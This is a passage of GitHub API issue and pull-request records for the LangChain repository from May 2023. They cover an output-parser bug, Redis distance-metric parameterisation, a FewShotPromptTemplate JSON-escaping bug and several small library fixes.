        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4371/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4371",
        "id": 1701154334,
        "node_id": "I_kwDOIPDwls5lZY4e",
        "number": 4371,
        "title": "ConvoOutputParser fails to parse a valid output which contains a code block",
        "user": {
            "login": "bharatsuri97",
            "id": 120420973,
            "node_id": "U_kgDOBy16bQ",
            "avatar_url": "https://avatars.githubusercontent.com/u/120420973?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/bharatsuri97",
            "html_url": "https://github.com/bharatsuri97",
            "followers_url": "https://api.github.com/users/bharatsuri97/followers",
            "following_url": "https://api.github.com/users/bharatsuri97/following{/other_user}",
            "gists_url": "https://api.github.com/users/bharatsuri97/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/bharatsuri97/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/bharatsuri97/subscriptions",
            "organizations_url": "https://api.github.com/users/bharatsuri97/orgs",
            "repos_url": "https://api.github.com/users/bharatsuri97/repos",
            "events_url": "https://api.github.com/users/bharatsuri97/events{/privacy}",
            "received_events_url": "https://api.github.com/users/bharatsuri97/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2023-05-09T01:22:18Z",
        "updated_at": "2023-11-14T16:08:54Z",
        "closed_at": "2023-11-14T16:08:53Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### System Info\n\nLangChain version: 0.0.162\r\nPython version: 3.8.10\n\n### Who can help?\n\n@hwchase17 \r\n\n\n### Information\n\n- [ ] The official example notebooks/scripts\n- [x] My own modified scripts\n\n### Related Components\n\n- [ ] LLMs/Chat Models\n- [ ] Embedding Models\n- [ ] Prompts / Prompt Templates / Prompt Selectors\n- [X] Output Parsers\n- [ ] Document Loaders\n- [ ] Vector Stores / Retrievers\n- [ ] Memory\n- [ ] Agents / Agent Executors\n- [ ] Tools / Toolkits\n- [ ] Chains\n- [ ] Callbacks/Tracing\n- [ ] Async\n\n### Reproduction\n\n```python\r\nimport os\r\nfrom langchain.chat_models import ChatOpenAI\r\nfrom langchain.agents import load_tools, initialize_agent, AgentType\r\nfrom langchain.memory import ConversationBufferMemory\r\n\r\nos.environ[\"OPENAI_API_KEY\"] = \"\"\r\n\r\nllm = ChatOpenAI(\r\n    temperature = 0.9,\r\n    max_tokens = 1024,\r\n    model_name = 'gpt-4'\r\n)\r\n\r\ndef create_memory():\r\n    memory = ConversationBufferMemory(memory_key=\"chat_history\", return_messages=True)\r\n    memory.clear()\r\n    return memory\r\ntools = load_tools(\r\n    [\"human\"],\r\n    llm=llm\r\n)\r\nagent = initialize_agent(\r\n            tools,\r\n            llm,\r\n            agent=AgentType.CHAT_CONVERSATIONAL_REACT_DESCRIPTION,\r\n            memory=create_memory(),\r\n            verbose=True\r\n        )\r\n\r\nagent.run('Write a python program to run a simple HTTP server')\r\n```\n\n### Expected behavior\n\nAgent is able to correctly parse the response from OpenAI.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4371/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4371/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4370",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4370/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4370/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4370/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4370",
        "id": 1701153684,
        "node_id": "PR_kwDOIPDwls5QDEpy",
        "number": 4370,
        "title": "Add top K as Self Query Retriever Get Documents Input",
        "user": {
            "login": "blc16",
            "id": 10980637,
            "node_id": "MDQ6VXNlcjEwOTgwNjM3",
            "avatar_url": "https://avatars.githubusercontent.com/u/10980637?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/blc16",
            "html_url": "https://github.com/blc16",
            "followers_url": "https://api.github.com/users/blc16/followers",
            "following_url": "https://api.github.com/users/blc16/following{/other_user}",
            "gists_url": "https://api.github.com/users/blc16/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/blc16/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/blc16/subscriptions",
            "organizations_url": "https://api.github.com/users/blc16/orgs",
            "repos_url": "https://api.github.com/users/blc16/repos",
            "events_url": "https://api.github.com/users/blc16/events{/privacy}",
            "received_events_url": "https://api.github.com/users/blc16/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2023-05-09T01:21:14Z",
        "updated_at": "2023-05-15T03:31:07Z",
        "closed_at": "2023-05-15T03:31:07Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4370",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4370",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4370.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4370.patch",
            "merged_at": "2023-05-15T03:31:07Z"
        },
        "body": "Add Top K as Optional Parameter for Self Query Retriever\r\n\r\nAdding k as a parameter to Self-Retriever's Get Relevant Documents method. This allows users to specify how many documents they want it to retrieve during a search. This is a fixed PR from previous PR: https://github.com/hwchase17/langchain/pull/4297\r\n\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n\r\n<!-- For a quicker response, figure out the right person to tag with @\r\n\r\n        @hwchase17 - project lead\r\n\r\n        Tracing / Callbacks\r\n        - @agola11\r\n\r\n        Async\r\n        - @agola11\r\n\r\n        DataLoader Abstractions\r\n        - @eyurtsev\r\n\r\n        LLM/Chat Wrappers\r\n        - @hwchase17\r\n        - @agola11\r\n\r\n        Tools / Toolkits\r\n        - @vowelparrot\r\n -->\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4370/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4370/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4369",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4369/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4369/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4369/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4369",
        "id": 1701134426,
        "node_id": "PR_kwDOIPDwls5QDAo9",
        "number": 4369,
        "title": "Fix Duplicate trust_remote_code in pipeline",
        "user": {
            "login": "vowelparrot",
            "id": 130414180,
            "node_id": "U_kgDOB8X2ZA",
            "avatar_url": "https://avatars.githubusercontent.com/u/130414180?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/vowelparrot",
            "html_url": "https://github.com/vowelparrot",
            "followers_url": "https://api.github.com/users/vowelparrot/followers",
            "following_url": "https://api.github.com/users/vowelparrot/following{/other_user}",
            "gists_url": "https://api.github.com/users/vowelparrot/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/vowelparrot/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/vowelparrot/subscriptions",
            "organizations_url": "https://api.github.com/users/vowelparrot/orgs",
            "repos_url": "https://api.github.com/users/vowelparrot/repos",
            "events_url": "https://api.github.com/users/vowelparrot/events{/privacy}",
            "received_events_url": "https://api.github.com/users/vowelparrot/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-09T00:57:01Z",
        "updated_at": "2023-05-10T17:21:55Z",
        "closed_at": "2023-05-10T17:21:54Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4369",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4369",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4369.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4369.patch",
            "merged_at": "2023-05-10T17:21:54Z"
        },
        "body": "### Fix issue with duplicate specification of `trust_remote_code` in HuggingFacePipeline\r\n\r\nFixes # 4351\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4369/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4369/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4368",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4368/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4368/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4368/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4368",
        "id": 1701125645,
        "node_id": "I_kwDOIPDwls5lZR4N",
        "number": 4368,
        "title": "Add distance metric param to to redis vectorstore index",
        "user": {
            "login": "EandrewJones",
            "id": 41238273,
            "node_id": "MDQ6VXNlcjQxMjM4Mjcz",
            "avatar_url": "https://avatars.githubusercontent.com/u/41238273?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/EandrewJones",
            "html_url": "https://github.com/EandrewJones",
            "followers_url": "https://api.github.com/users/EandrewJones/followers",
            "following_url": "https://api.github.com/users/EandrewJones/following{/other_user}",
            "gists_url": "https://api.github.com/users/EandrewJones/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/EandrewJones/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/EandrewJones/subscriptions",
            "organizations_url": "https://api.github.com/users/EandrewJones/orgs",
            "repos_url": "https://api.github.com/users/EandrewJones/repos",
            "events_url": "https://api.github.com/users/EandrewJones/events{/privacy}",
            "received_events_url": "https://api.github.com/users/EandrewJones/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-09T00:40:32Z",
        "updated_at": "2023-05-11T07:20:03Z",
        "closed_at": "2023-05-11T07:20:03Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Feature request\n\nRedis vectorstore allows for three different distance metrics: `L2` (flat L2), `COSINE`, and `IP` (inner product). Currently, the  `Redis._create_index` method hard codes the distance metric to COSINE.\r\n\r\n```py\r\ndef _create_index(self, dim: int = 1536) -> None:\r\n        try:\r\n            from redis.commands.search.field import TextField, VectorField\r\n            from redis.commands.search.indexDefinition import IndexDefinition, IndexType\r\n        except ImportError:\r\n            raise ValueError(\r\n                \"Could not import redis python package. \"\r\n                \"Please install it with `pip install redis`.\"\r\n            )\r\n\r\n        # Check if index exists\r\n        if not _check_index_exists(self.client, self.index_name):\r\n            # Constants\r\n            distance_metric = (\r\n                \"COSINE\"  # distance metric for the vectors (ex. COSINE, IP, L2)\r\n            )\r\n            schema = (\r\n                TextField(name=self.content_key),\r\n                TextField(name=self.metadata_key),\r\n                VectorField(\r\n                    self.vector_key,\r\n                    \"FLAT\",\r\n                    {\r\n                        \"TYPE\": \"FLOAT32\",\r\n                        \"DIM\": dim,\r\n                        \"DISTANCE_METRIC\": distance_metric,\r\n                    },\r\n                ),\r\n            )\r\n            prefix = _redis_prefix(self.index_name)\r\n\r\n            # Create Redis Index\r\n            self.client.ft(self.index_name).create_index(\r\n                fields=schema,\r\n                definition=IndexDefinition(prefix=[prefix], index_type=IndexType.HASH),\r\n            )\r\n```\r\n\r\nThis should be parameterized.\n\n### Motivation\n\nI'd like to be able to use L2 distance metrics.\n\n### Your contribution\n\nI've already forked and made a branch that parameterizes the distance metric in `langchain.vectorstores.redis`:\r\n\r\n```py\r\n def _create_index(self, dim: int = 1536, distance_metric: REDIS_DISTANCE_METRICS = \"COSINE\") -> None:\r\n        try:\r\n            from redis.commands.search.field import TextField, VectorField\r\n            from redis.commands.search.indexDefinition import IndexDefinition, IndexType\r\n        except ImportError:\r\n            raise ValueError(\r\n                \"Could not import redis python package. \"\r\n                \"Please install it with `pip install redis`.\"\r\n            )\r\n\r\n        # Check if index exists\r\n        if not _check_index_exists(self.client, self.index_name):\r\n            # Define schema\r\n            schema = (\r\n                TextField(name=self.content_key),\r\n                TextField(name=self.metadata_key),\r\n                VectorField(\r\n                    self.vector_key,\r\n                    \"FLAT\",\r\n                    {\r\n                        \"TYPE\": \"FLOAT32\",\r\n                        \"DIM\": dim,\r\n                        \"DISTANCE_METRIC\": distance_metric,\r\n                    },\r\n                ),\r\n            )\r\n            prefix = _redis_prefix(self.index_name)\r\n\r\n            # Create Redis Index\r\n            self.client.ft(self.index_name).create_index(\r\n                fields=schema,\r\n                definition=IndexDefinition(prefix=[prefix], index_type=IndexType.HASH),\r\n            ) def _create_index(self, dim: int = 1536, distance_metric: REDIS_DISTANCE_METRICS = \"COSINE\") -> None:\r\n        try:\r\n            from redis.commands.search.field import TextField, VectorField\r\n            from redis.commands.search.indexDefinition import IndexDefinition, IndexType\r\n        except ImportError:\r\n            raise ValueError(\r\n                \"Could not import redis python package. \"\r\n                \"Please install it with `pip install redis`.\"\r\n            )\r\n\r\n        # Check if index exists\r\n        if not _check_index_exists(self.client, self.index_name):\r\n            # Define schema\r\n            schema = (\r\n                TextField(name=self.content_key),\r\n                TextField(name=self.metadata_key),\r\n                VectorField(\r\n                    self.vector_key,\r\n                    \"FLAT\",\r\n                    {\r\n                        \"TYPE\": \"FLOAT32\",\r\n                        \"DIM\": dim,\r\n                        \"DISTANCE_METRIC\": distance_metric,\r\n                    },\r\n                ),\r\n            )\r\n            prefix = _redis_prefix(self.index_name)\r\n\r\n            # Create Redis Index\r\n            self.client.ft(self.index_name).create_index(\r\n                fields=schema,\r\n                definition=IndexDefinition(prefix=[prefix], index_type=IndexType.HASH),\r\n            )\r\n\r\n...\r\n\r\n  @classmethod\r\n    def from_texts(\r\n        cls: Type[Redis],\r\n        texts: List[str],\r\n        embedding: Embeddings,\r\n        metadatas: Optional[List[dict]] = None,\r\n        index_name: Optional[str] = None,\r\n        content_key: str = \"content\",\r\n        metadata_key: str = \"metadata\",\r\n        vector_key: str = \"content_vector\",\r\n        distance_metric: REDIS_DISTANCE_METRICS = \"COSINE\",\r\n        **kwargs: Any,\r\n    ) -> Redis:\r\n        \"\"\"Create a Redis vectorstore from raw documents.\r\n        This is a user-friendly interface that:\r\n            1. Embeds documents.\r\n            2. Creates a new index for the embeddings in Redis.\r\n            3. Adds the documents to the newly created Redis index.\r\n        This is intended to be a quick way to get started.\r\n        Example:\r\n            .. code-block:: python\r\n                from langchain.vectorstores import Redis\r\n                from langchain.embeddings import OpenAIEmbeddings\r\n                embeddings = OpenAIEmbeddings()\r\n                redisearch = RediSearch.from_texts(\r\n                    texts,\r\n                    embeddings,\r\n                    redis_url=\"redis://username:password@localhost:6379\"\r\n                )\r\n        \"\"\"\r\n        redis_url = get_from_dict_or_env(kwargs, \"redis_url\", \"REDIS_URL\")\r\n\r\n        if \"redis_url\" in kwargs:\r\n            kwargs.pop(\"redis_url\")\r\n\r\n        # Name of the search index if not given\r\n        if not index_name:\r\n            index_name = uuid.uuid4().hex\r\n\r\n        # Create instance\r\n        instance = cls(\r\n            redis_url=redis_url,\r\n            index_name=index_name,\r\n            embedding_function=embedding.embed_query,\r\n            content_key=content_key,\r\n            metadata_key=metadata_key,\r\n            vector_key=vector_key,\r\n            **kwargs,\r\n        )\r\n\r\n        # Create embeddings over documents\r\n        embeddings = embedding.embed_documents(texts)\r\n\r\n        # Create the search index\r\n        instance._create_index(dim=len(embeddings[0]), distance_metric=distance_metric)\r\n\r\n        # Add data to Redis\r\n        instance.add_texts(texts, metadatas, embeddings)\r\n        return instance\r\n```\r\n\r\nI'll make the PR and link this issue",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4368/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4368/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4367",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4367/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4367/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4367/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4367",
        "id": 1701078306,
        "node_id": "I_kwDOIPDwls5lZGUi",
        "number": 4367,
        "title": "FewShotPromptTemplate bug on examples with JSON strings",
        "user": {
            "login": "JoaoSilva02",
            "id": 45149428,
            "node_id": "MDQ6VXNlcjQ1MTQ5NDI4",
            "avatar_url": "https://avatars.githubusercontent.com/u/45149428?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/JoaoSilva02",
            "html_url": "https://github.com/JoaoSilva02",
            "followers_url": "https://api.github.com/users/JoaoSilva02/followers",
            "following_url": "https://api.github.com/users/JoaoSilva02/following{/other_user}",
            "gists_url": "https://api.github.com/users/JoaoSilva02/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/JoaoSilva02/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/JoaoSilva02/subscriptions",
            "organizations_url": "https://api.github.com/users/JoaoSilva02/orgs",
            "repos_url": "https://api.github.com/users/JoaoSilva02/repos",
            "events_url": "https://api.github.com/users/JoaoSilva02/events{/privacy}",
            "received_events_url": "https://api.github.com/users/JoaoSilva02/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2023-05-08T23:29:13Z",
        "updated_at": "2023-10-26T10:51:29Z",
        "closed_at": "2023-06-26T15:30:05Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### System Info\r\n\r\nConsider the following python code snippet below.\r\n\r\n\r\nOn the example, the code will provide an error. This is due to the fact that it is not correctly parsing the JSON strings.\r\nFor some reason, the template will try to look for the variable \"Person\", when that is just a JSON output form.\r\n\r\nThis means that the classes are confusing what are variables of the template and what are just text within a JSON string on what we are feeding as an example.\r\n\r\nWhat is curious is that this does not happen for the PromptTemplate class. So, it must be about the iteration between examples.\r\n\r\n\r\n### Who can help?\r\n\r\n_No response_\r\n\r\n### Information\r\n\r\n- [ ] The official example notebooks/scripts\r\n- [ ] My own modified scripts\r\n\r\n### Related Components\r\n\r\n- [ ] LLMs/Chat Models\r\n- [ ] Embedding Models\r\n- [X] Prompts / Prompt Templates / Prompt Selectors\r\n- [X] Output Parsers\r\n- [ ] Document Loaders\r\n- [ ] Vector Stores / Retrievers\r\n- [ ] Memory\r\n- [ ] Agents / Agent Executors\r\n- [ ] Tools / Toolkits\r\n- [ ] Chains\r\n- [ ] Callbacks/Tracing\r\n- [ ] Async\r\n\r\n### Reproduction\r\n\r\npython'''\r\n\r\nfrom langchain import PromptTemplate\r\nfrom langchain import FewShotPromptTemplate\r\nfrom langchain.prompts.example_selector import LengthBasedExampleSelector\r\nimport json\r\n\r\n\r\n# create our examples\r\nexamples = [\r\n    {\r\n        \"query\": \"my text number 1\",\r\n        \"answer\": \"\"\"{\"person\": \"Jack\", \"Location\": \"France\"}\"\"\"\r\n    },\r\n    {\r\n        \"query\": \"my text number 2\",\r\n        \"answer\": \"\"\"{\"person\": \"James\", \"Location\": \"Portugal\"}\"\"\"\r\n    }\r\n]\r\n\r\n# create a example template\r\nexample_template = \"\"\"\r\nUser: {query}\r\nAI: {answer}\r\n\"\"\"\r\n\r\n# create a prompt example from above template\r\nexample_prompt = PromptTemplate(\r\n    input_variables=[\"query\", \"answer\"],\r\n    template=example_template\r\n)\r\n\r\n# now break our previous prompt into a prefix and suffix\r\n# the prefix is our instructions\r\ntask_description = f\"\"\"\r\nContext for the task\r\n\"\"\"\r\n\r\n# and the suffix our user input and output indicator\r\ninstruction = \"\"\"\r\nUser: {query}\r\nAI: \"\"\"\r\n\r\n# now create the few shot prompt template\r\nfew_shot_prompt_template = FewShotPromptTemplate(\r\n    examples=examples,\r\n    example_prompt=example_prompt,\r\n    prefix=task_description,\r\n    suffix=instruction,\r\n    input_variables=[\"query\"],\r\n    example_separator=\"\\n\\n\"\r\n)\r\n\r\nprint(few_shot_prompt_template.format(query=\"My awesome query\"))\r\n\r\n'''\r\n\r\n### Expected behavior\r\n\r\nIt would be expected to output a prompt with several examples in which the answer was a JSON string:\r\n\r\n\r\n\r\n\"\"\"\r\nUser: My text number 1\r\nAI: {\"person\": \"Jack\", \"Location\": \"France\"}\r\n\r\n\r\nUser: My text number 2\r\nAI: {\"person\": \"James\", \"Location\": \"Portugal\"}\r\n\r\n\r\nUser: My new input text\r\nAI:\r\n\"\"\"",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4367/reactions",
            "total_count": 2,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 1,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4367/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4366",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4366/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4366/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4366/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4366",
        "id": 1701067745,
        "node_id": "PR_kwDOIPDwls5QCyU_",
        "number": 4366,
        "title": "Dev2049/check model kwargs",
        "user": {
            "login": "dev2049",
            "id": 130488702,
            "node_id": "U_kgDOB8cZfg",
            "avatar_url": "https://avatars.githubusercontent.com/u/130488702?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dev2049",
            "html_url": "https://github.com/dev2049",
            "followers_url": "https://api.github.com/users/dev2049/followers",
            "following_url": "https://api.github.com/users/dev2049/following{/other_user}",
            "gists_url": "https://api.github.com/users/dev2049/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dev2049/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dev2049/subscriptions",
            "organizations_url": "https://api.github.com/users/dev2049/orgs",
            "repos_url": "https://api.github.com/users/dev2049/repos",
            "events_url": "https://api.github.com/users/dev2049/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dev2049/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-08T23:11:28Z",
        "updated_at": "2023-05-12T18:02:03Z",
        "closed_at": "2023-05-08T23:37:34Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4366",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4366",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4366.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4366.patch",
            "merged_at": "2023-05-08T23:37:34Z"
        },
        "body": "Handle duplicate and incorrectly specified OpenAI params\r\n\r\nThanks @PawelFaron for the fix! Made small update\r\n\r\nCloses #4331 ",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4366/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4366/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4365",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4365/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4365/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4365/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4365",
        "id": 1701047442,
        "node_id": "PR_kwDOIPDwls5QCtwt",
        "number": 4365,
        "title": "using nearText or nearVector to request weaviate",
        "user": {
            "login": "ZouhairElhadi",
            "id": 87149442,
            "node_id": "MDQ6VXNlcjg3MTQ5NDQy",
            "avatar_url": "https://avatars.githubusercontent.com/u/87149442?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ZouhairElhadi",
            "html_url": "https://github.com/ZouhairElhadi",
            "followers_url": "https://api.github.com/users/ZouhairElhadi/followers",
            "following_url": "https://api.github.com/users/ZouhairElhadi/following{/other_user}",
            "gists_url": "https://api.github.com/users/ZouhairElhadi/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ZouhairElhadi/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ZouhairElhadi/subscriptions",
            "organizations_url": "https://api.github.com/users/ZouhairElhadi/orgs",
            "repos_url": "https://api.github.com/users/ZouhairElhadi/repos",
            "events_url": "https://api.github.com/users/ZouhairElhadi/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ZouhairElhadi/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 4678528832,
                "node_id": "LA_kwDOIPDwls8AAAABFtyvQA",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/question",
                "name": "question",
                "color": "d876e3",
                "default": true,
                "description": "Further information is requested"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2023-05-08T22:50:13Z",
        "updated_at": "2023-05-17T02:43:55Z",
        "closed_at": "2023-05-17T02:43:55Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4365",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4365",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4365.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4365.patch",
            "merged_at": null
        },
        "body": "I updated the class Weavaite in the module weaviate, by:\r\n- Adding an attribute by_text, takes the value True by default, if this attribute is true, we can use the nearText to request data from weaviate, else we use nearVector.\r\n- I changed the name of similarity_search to similarity_search_by_text, which using nearText\r\n- I added a new method similarity_search, which checks the attribute by_text and based on its value we can using nearText or nearVector\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4365/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4365/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4364",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4364/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4364/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4364/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4364",
        "id": 1701028672,
        "node_id": "PR_kwDOIPDwls5QCpxZ",
        "number": 4364,
        "title": "fix json saving, update docs to reference anthropic chat model",
        "user": {
            "login": "agola11",
            "id": 9536492,
            "node_id": "MDQ6VXNlcjk1MzY0OTI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/9536492?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/agola11",
            "html_url": "https://github.com/agola11",
            "followers_url": "https://api.github.com/users/agola11/followers",
            "following_url": "https://api.github.com/users/agola11/following{/other_user}",
            "gists_url": "https://api.github.com/users/agola11/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/agola11/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/agola11/subscriptions",
            "organizations_url": "https://api.github.com/users/agola11/orgs",
            "repos_url": "https://api.github.com/users/agola11/repos",
            "events_url": "https://api.github.com/users/agola11/events{/privacy}",
